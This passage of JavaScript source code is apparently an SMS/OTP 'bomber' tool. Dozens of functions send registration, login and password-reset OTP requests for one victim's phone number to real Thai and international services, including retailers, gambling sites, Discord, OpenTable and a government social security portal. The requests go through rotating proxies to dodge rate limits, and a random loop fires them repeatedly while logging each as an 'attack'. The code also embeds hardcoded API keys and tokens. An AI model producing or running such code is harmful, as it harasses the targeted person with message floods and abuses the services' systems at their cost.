                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "phone_no": phone
                });
    
                var config = {
                    method: 'post',
                    url: 'https://api.scg-id.com/api/otp/send_otp',
                    httpsAgent: agent,
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : scg"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk8() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "on": {
                        "value": phone,
                        "country": "66"
                    },
                    "type": "mobile"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://the1web-api.the1.co.th/api/t1p/regis/requestOTP',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : the1"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk9() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/' + phone,
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : kerry"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk10() {
                var phone = phonenumber.substring(1);
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "operationName": "sendOtp",
                    "variables": {
                        "input": {
                            "mobileNumber": phone,
                            "phoneCode": "THA-66"
                        }
                    },
                    "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://graph.firster.com/graphql',
                    headers: {
                        'organizationcode': 'lifestyle',
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : graph"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk11() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "lang": "th",
                    "userType": "BUYER",
                    "locale": "th",
                    "orgIdfier": "scg",
                    "phone": phone,
                    "type": "signup",
                    "otpTemplate": "buyer_signup_otp_message",
                    "userParams": {
                        "buyerName": randomstr(10)
                    }
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : nocnoc"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk12() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "brands_id": "609caede5a67e5001164b89d",
                    "agent_register": "60a22f7d233d2900110070d7",
                    "tel": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://m.lucabet168.com/api/register-otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : lucabet"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk13() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=' + phone,
                    headers: {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38'
                    }
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : vcanbuy"));
                    }).catch(function (error) { });
    
            }
            function sk14() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "username": phone,
                    "password": "6302814184624az",
                    "name": "0903281894",
                    "provinceCode": "28",
                    "districtCode": "393",
                    "subdistrictCode": "3494",
                    "zipcode": "40260",
                    "siebelCustomerTypeId": "710",
                    "acceptTermAndCondition": "true",
                    "hasSeenConsent": "false",
                    "locale": "th_TH"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://ocs-prod-api.makroclick.com/next-ocs-member/user/register',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : ocs-prod"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk15() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = JSON.stringify({
                    "phone": "+66" + phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://discord.com/api/v9/auth/register/phone',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : discord"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk16() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'post',
                    url: 'https://www.scgexpress.co.th/member/getRegister?phone=' + phone,
                    httpsAgent: agent,
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : scgexpress"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk17() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = qs.stringify({
                    'phoneno': phone,
                    'retrycount': '0'
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : worngnai"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk18() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = new FormData();
                data.append('phone', phone);
    
                var config = {
                    method: 'post',
                    url: 'https://www.msport1688.com/auth/send_otp',
                    httpsAgent: agent,
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : msport1688"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk19() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = qs.stringify({
                    'dCard': '1358231116147',
                    'Mobile': phone,
                    'password': '098098Az',
                    'repassword': '098098Az',
                    'perPrefix': 'Mr.',
                    'cn': 'Dhdhhs',
                    'sn': 'Vssbsh&perBirthday=5',
                    'perBirthmonth': '5',
                    'perBirthyear': '2545',
                    'Email': 'nickytom5879%40gmail.com',
                    'otp_type': 'OTP',
                    'otpvalue': '',
                    'messageId': 'REGISTER'
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : sso"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk20() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "username": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.mcshop.com/cognito/me/forget-password',
                    headers: {
                        'x-store-token': 'mcshop',
                        'x-api-key': 'ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3',
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : mcshop"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk21() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'get',
                    url: 'https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo=' + phone + '&type=Register',
                    httpsAgent: agent,
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : asv"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk22() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "brands_id": "5ffc0caa4d603200124e4eb1",
                    "agent_register": "5ffc0d5cdcd4f30012aec3d9",
                    "tel": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://m.lavagame168.com/api/register-otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : lavagame168"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk23() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'get',
                    httpsAgent: agent,
                    url: 'https://m.redbus.id/api/getOtp?number=' + phone + '&cc=66&whatsAppOpted=true',
                    headers: {
                        'traceparent': '00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01',
                    }
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : redbus"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk24() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "phoneNumber": phone,
                    "token": "HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://samartbet.com/api/request/otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : samartbet"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk25() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = new FormData();
                data.append('phone', phone);
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.msport1688.com/auth/send_otp',
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : msport"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk26() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // httpsAgent: agent,
                var data = new FormData();
                data.append('phone', phone);
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://ep789bet.net/auth/send_otp',
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : ep789"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk27() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = '{"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":"+66' + phone + '","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":"+66' + phone + '"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]}';
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://cognito-idp.ap-southeast-1.amazonaws.com/',
                    headers: {
                        'content-type': 'application/x-amz-json-1.1',
                        'x-amz-target': 'AWSCognitoIdentityProviderService.SignUp',
                        'x-amz-user-agent': 'aws-amplify/0.1.x js',
                        'referer': 'https://www.bugaboo.tv/members/signup/phone'
                    },
                    data: data
                };
                var data2 = '{"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":"+66' + phone + '"}';
                var config2 = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://cognito-idp.ap-southeast-1.amazonaws.com/',
                    headers: {
                        'content-type': 'application/x-amz-json-1.1',
                        'x-amz-target': 'AWSCognitoIdentityProviderService.ResendConfirmationCode',
                        'x-amz-user-agent': 'aws-amplify/0.1.x js',
                        'referer': 'https://www.bugaboo.tv/members/resetpass/phone'
                    },
                    data: data2
                };
                axios(config).then(function (response) {
                    axios(config2)
                        .then(function (response) {
                            console.log(colors.rainbow("attack : bagabo"));
                            countting++;
                        }).catch(function (error) { });
                }).catch(function (error) { });
    
                // httpsAgent: agent,
    
            }
            function sk28() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "username": phone,
                    "optType": 0
                });
    
                var config = {
                    method: 'post',
                    url: 'https://www.carsome.co.th/website/login/sendSMS',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    httpsAgent: agent,
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : carsome"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk29() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "brands_id": "60a6563a232a600012521982",
                    "agent_register": "60a76a7f233d2900110070e0",
                    "tel": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://m.riches666.com/api/register-otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : riches666"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk30() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = qs.stringify({
                    'required': 'otp',
                    'mobile': phone
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.pruksa.com/member/member_otp/re_create',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : pruksa"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk31() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "msisdn": phone,
                    "function": "enroll"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://vaccine.trueid.net/vacc-verify/api/getotp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : trueid"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk32() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "phone": phone,
                    "type": "2",
                    "ctype": "1"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.mrcash.top/h5/LoginMessage_ultimate',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': 'sass_think_var=vt-se'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : mrcash"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk33() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "brands_id": "60e4016f35119800184f34a5",
                    "agent_register": "60e57c3b2ead950012fc5fba",
                    "tel": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://m.pgwin168.com/api/register-otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : pgwin168"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk34() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "applicant": phone,
                    "serviceName": "SOM777"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.som777.com/api/otp/register',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : som777"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk35() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "applicant": phone,
                    "serviceName": "KONGLOR888"
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.konglor888.com/api/otp/register',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : konglor888"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk36() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var config = {
                    method: 'get',
                    httpsAgent: agent,
                    url: 'https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone=' + phone + '&img_code=',
                    headers: {}
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : quickcash"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk37() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "operationName": "SendVerificationCodePhone",
                    "variables": {
                      "via": "sms",
                      "phoneNumber": phone,
                      "phoneNumberCountryCode": "66"
                    },
                    "extensions": {
                      "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"
                      }
                    }
                  });
                  
                  var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.opentable.com/dapi/fe/gql',
                    headers: { 
                      'x-csrf-token': '30741e7f-18cc-4b72-82be-fd50616be91d', 
                      'Content-Type': 'application/json', 
                    },
                    data : data
                  };
                  
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : opentable"));
                        countting++;
                    }).catch(function (error) { });
            }
            
            function sk38() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "operationName": "SendVerificationCodePhone",
                    "variables": {
                      "via": "call",
                      "phoneNumber": phone,
                      "phoneNumberCountryCode": "66"
                    },
                    "extensions": {
                      "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"
                      }
                    }
                  });
                  
                  var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.opentable.com/dapi/fe/gql',
                    headers: { 
                      'x-csrf-token': '30741e7f-18cc-4b72-82be-fd50616be91d', 
                      'Content-Type': 'application/json', 
                    },
                    data : data
                  };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : opentable"));
                        countting++;
                    }).catch(function (error) { });
            }
    
            setInterval(() => {
                if (count == countting) {
                    process.exit(0);
                } else {
                    var randomnum = Math.floor(Math.random() * 250);
                    switch (randomnum + 1) {
                        case 1: {
                            getais();
                            break;
                        }
                        case 2: {
                            monomax();
                            break;
                        }
                        case 3: {
                            newapi();
                            break;
                        }
                        case 4: {
                            newapi2();
                            break;
                        }
                        case 5: {
                            newapi3();
                            break;
                        }
                        case 6: {
                            newapi4();
                            break;
                        }
                        case 7: {
                            newapi5();
                            break;
                        }
                        case 8: {
                            newapi6();
                            break;
                        }
                        case 9: {
                            newapi7();
                            break;
                        }
                        case 10: {
                            newapi8();
                            break;
                        }
                        case 11: {
                            newapi9();
                            break;
                        }
                        case 12: {
                            newapi10();
                            break;
                        }
                        case 13: {
                            setmember_spam();
                            break;
                        }
                        case 14: {
                            Mcard_spam();
                            break;
                        }
                        case 15: {
                            newapi15();
                            break;
                        }
                        case 16: {
                            newapi16();
                            break;
                        }
                        case 17: {
                            shopat24_spam()
                            break;
                        }
                        case 18: {
                            Mcard_spam()
                            break;
                        }
                        case 19: {
                            setmember_spam()
                            break;
                        }
                        case 21: {
                            baccarat_spam()
                            break;
                        }
                        case 22: {
                            pizza_spam()
                            break;
                        }
                        case 23: {
                            toyota_spam()
                            break;
                        }
                        case 24: {
                            QQmoney_spam()
                            break;
                        }
                        case 25: {
                            Mooncash_spam()
                            break;
                        }
                        case 26: {
                            Needmoney_spam()
                            break;
                        }
                        case 27: {
                            bet4u_spam()
                            break;
                        }
                        case 28: {
                            ufa_spam()
                            break;
                        }
                        case 29: {
                            sk1()
                            break;
                        }
                        case 30: {
                            sk2()
                            break;
                        }
                        case 31: {
                            sk3()
                            break;
                        }
                        case 32: {
                            sk4()
                            break;
                        }
                        case 33: {
                            sk5()
                            break;
                        }
                        case 34: {
                            sk6()
                            break;
                        }
                        case 35: {
                            sk7()
                            break;
                        }
                        case 36: {
                            sk8()
                            break;
                        }
                        case 37: {
                            sk9()
                            break;
                        }
                        case 38: {
                            sk10()
                            break;
                        }
                        case 39: {
                            sk11()
                            break;
                        }
                        case 40: {
                            sk12()
                            break;
                        }
                        case 41: {
                            sk13()
                            break;
                        }
                        case 42: {
                            sk14()
                            break;
                        }
                        case 43: {
                            sk15()
                            break;
                        }
                        case 44: {
                            sk16()
                            break;
                        }
                        case 45: {
                            sk17()
                            break;
                        }
                        case 46: {
                            sk18()
                            break;
                        }
                        case 47: {
                            sk19()
                            break;
                        }
                        case 48: {
                            sk18()
                            break;
                        }
                        case 49: {
                            sk19()
                            break;
                        }
                        case 50: {
                            sk20()
                            break;
                        }
                        case 51: {
                            sk21()
                            break;
                        }
                        case 52: {
                            sk22()
                            break;
                        }
                        case 53: {
                            sk23()
                            break;
                        }
                        case 54: {
                            sk24()
                            break;
                        }                    
                        case 55: {
                            sk25()
                            break;
                        }                    
                        case 56: {
                            sk26()
                            break;
                        }                    
                        case 57: {
                            sk27()
                            break;
                        }                    
                        case 58: {
                            sk28()
                            break;
                        }                    
                        case 59: {
                            sk29()
                            break;
                        }                    
                        case 60: {
                            sk30()
                            break;
                        }                    
                        case 61: {
                            sk31()
                            break;
                        }                    
                        case 62: {
                            sk32()
                            break;
                        }                    
                        case 63: {
                            sk33()
                            break;
                        }                    
                        case 64: {
                            sk33()
                            break;
                        }                    
                        case 65: {
                            sk34()
                            break;
                        }                    
                        case 66: {
                            sk35()
                            break;
                        }                    
                        case 67: {
                            sk36()
                            break;
                        }        
                        case 68: {
                            sk37()
                            break;
                        }                  
                        case 69:{
                            sk38()
                            break;
                        }
                        case 70: {
                            getais();
                            break;
                        }
                        case 71: {
                            monomax();
                            break;
                        }
                        case 72: {
                            newapi();
                            break;
                        }
                        case 73: {
                            newapi2();
                            break;
                        }
                        case 74: {
                            newapi3();
                            break;
                        }
                        case 75: {
                            newapi4();
                            break;
                        }
                        case 76: {
                            newapi5();
                            break;
                        }
                        case 77: {
                            newapi6();
                            break;
                        }
                        case 78: {
                            newapi7();
                            break;
                        }
                        case 79: {
                            newapi8();
                            break;
                        }
                        case 80: {
                            newapi9();
                            break;
                        }
                        case 81: {
                            newapi10();
                            break;
                        }
                        case 82: {
                            setmember_spam();
                            break;
                        }
                        case 83: {
                            Mcard_spam();
                            break;
                        }
                        case 84: {
                            newapi15();
                            break;
                        }
                        case 85: {
                            newapi16();
                            break;
                        }
                        case 86: {
                            shopat24_spam()
                            break;
                        }
                        case 87: {
                            Mcard_spam()
                            break;
                        }
                        case 88: {
                            setmember_spam()
                            break;
                        }
                        case 89: {
                            baccarat_spam()
                            break;
                        }
                        case 90: {
                            pizza_spam()
                            break;
                        }
                        case 91: {
                            toyota_spam()
                            break;
                        }
                        case 92: {
                            QQmoney_spam()
                            break;
                        }
                        case 93: {
                            Mooncash_spam()
                            break;
                        }
                        case 94: {
                            Needmoney_spam()
                            break;
                        }
                        case 95: {
                            bet4u_spam()
                            break;
                        }
                        case 96: {
                            ufa_spam()
                            break;
                        }
                        case 97: {
                            sk1()
                            break;
                        }
                        case 98: {
                            sk2()
                            break;
                        }
                        case 99: {
                            sk3()
                            break;
                        }
                        case 100: {
                            sk4()
                            break;
                        }
                        case 101: {
                            getais();
                            break;
                        }
                        case 102: {
                            monomax();
                            break;
                        }
                        case 103: {
                            newapi();
                            break;
                        }
                        case 104: {
                            newapi2();
                            break;
                        }
                        case 105: {
                            newapi3();
                            break;
                        }
                        case 106: {
                            newapi4();
                            break;
                        }
                        case 107: {
                            newapi5();
                            break;
                        }
                        case 108: {
                            newapi6();
                            break;
                        }
                        case 109: {
                            newapi7();
                            break;
                        }
                        case 110: {
                            newapi8();
                            break;
                        }
                        case 111: {
                            newapi9();
                            break;
                        }
                        case 112: {
                            newapi10();
                            break;
                        }
                        case 113: {
                            setmember_spam();
                            break;
                        }
                        case 114: {
                            Mcard_spam();
                            break;
                        }
                        case 115: {
                            newapi15();
                            break;
                        }
                        case 116: {
                            newapi16();
                            break;
                        }
                        case 117: {
                            shopat24_spam()
                            break;
                        }
                        case 118: {
                            Mcard_spam()
                            break;
                        }
                        case 119: {
                            setmember_spam()
                            break;
                        }
                        case 120: {
                            baccarat_spam()
                            break;
                        }
                        case 121: {
                            pizza_spam()
                            break;
                        }
                        case 122: {
                            toyota_spam()
                            break;
                        }
                        case 123: {
                            QQmoney_spam()
                            break;
                        }
                        case 124: {
                            Mooncash_spam()
                            break;
                        }
                        case 125: {
                            Needmoney_spam()
                            break;
                        }
                        case 126: {
                            bet4u_spam()
                            break;
                        }
                        case 127: {
                            ufa_spam()
                            break;
                        }
                        case 128: {
                            sk1()
                            break;
                        }
                        case 129: {
                            sk2()
                            break;
                        }
                        case 130: {
                            sk3()
                            break;
                        }
                        case 131: {
                            sk4()
                            break;
                        }
                        case 132: {
                            sk5()
                            break;
                        }
                        case 133: {
                            sk6()
                            break;
                        }
                        case 134: {
                            sk7()
                            break;
                        }
                        case 135: {
                            sk8()
                            break;
                        }
                        case 136: {
                            sk9()
                            break;
                        }
                        case 137: {
                            sk10()
                            break;
                        }
                        case 138: {
                            sk11()
                            break;
                        }
                        case 139: {
                            sk12()
                            break;
                        }
                        case 140: {
                            sk13()
                            break;
                        }
                        case 141: {
                            sk14()
                            break;
                        }
                        case 142: {
                            sk15()
                            break;
                        }
                        case 143: {
                            sk16()
                            break;
                        }
                        case 144: {
                            sk17()
                            break;
                        }
                        case 145: {
                            sk18()
                            break;
                        }
                        case 146: {
                            sk19()
                            break;
                        }
                        case 147: {
                            sk18()
                            break;
                        }
                        case 148: {
                            sk19()
                            break;
                        }
                        case 149: {
                            sk20()
                            break;
                        }
                        case 150: {
                            sk21()
                            break;
                        }
                        case 151: {
                            sk22()
                            break;
                        }
                        case 152: {
                            sk23()
                            break;
                        }
                        case 153: {
                            sk24()
                            break;
                        }                    
                        case 154: {
                            sk25()
                            break;
                        }                    
                        case 155: {
                            sk26()
                            break;
                        }                    
                        case 156: {
                            sk27()
                            break;
                        }                    
                        case 157: {
                            sk28()
                            break;
                        }                    
                        case 158: {
                            sk29()
                            break;
                        }                    
                        case 159: {
                            sk30()
                            break;
                        }                    
                        case 160: {
                            sk31()
                            break;
                        }                    
                        case 161: {
